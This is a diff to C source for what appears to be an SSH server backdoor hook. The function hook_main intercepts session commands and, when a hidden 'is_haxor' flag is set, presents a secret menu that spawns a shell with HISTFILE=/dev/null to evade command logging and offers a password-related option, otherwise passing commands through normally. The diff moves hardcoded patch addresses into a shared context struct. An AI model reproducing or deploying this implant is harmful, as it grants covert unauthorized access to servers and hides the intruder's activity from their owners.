@@ -1,6 +1,8 @@
 #include "syscall.h"
 #include "config.h"
 
+extern void *hook_context;
+
 void _memset(unsigned char *dst, unsigned char val, int len) {
 	while(len--) {
 		*dst++ = val;
@@ -41,14 +43,15 @@ typedef struct {
     char    *term;
 } Session;
 
-typedef int (*f_do_child)(Session*, char*);
+typedef struct {
+	config_block *config_memory;
+	int (*do_child)(Session*, char*);
+} hook_ctx;
 
 int hook_main(Session *s, char *command) {
 	char input[2];
 
-	char *a_argv[]={
-		"id", 0
-	};
+	hook_ctx *ctx = (hook_ctx*)(&hook_context);
 
 	char menu[]=
 		"\n"
@@ -77,11 +80,7 @@ int hook_main(Session *s, char *command) {
 	char pass_str[]=
 		"\nLOL passwords..\n\n";
 
-	config_block *config_memory = (config_block*)(0xc0debabe13371337);
-
-	f_do_child do_child = (f_do_child)(0xc0cac01ac0debabe);
-
-	if (s->term != 0 && config_memory->is_haxor) {
+	if (s->term != 0 && ctx->config_memory->is_haxor) {
 		_write(1, menu, _strlen(menu));
 
 		while(1) {
@@ -94,7 +93,7 @@ int hook_main(Session *s, char *command) {
 				break;
 
 				case '1':
-					return do_child(s, "HISTFILE=/dev/null /bin/sh");
+					return ctx->do_child(s, "HISTFILE=/dev/null /bin/sh");
 				break;
 
 				case '2':
@@ -102,11 +101,7 @@ int hook_main(Session *s, char *command) {
 				break;
 
 				case '3':
-					return do_child(s, "exit");
-				break;
-
-				case '4':
-					_execve("/usr/bin/id", a_argv, 0);
+					return ctx->do_child(s, "exit");
 				break;
 
 				default:
@@ -116,5 +111,5 @@ int hook_main(Session *s, char *command) {
 		}
 	}
 	
-	return do_child(s, command);
+	return ctx->do_child(s, command);
 }
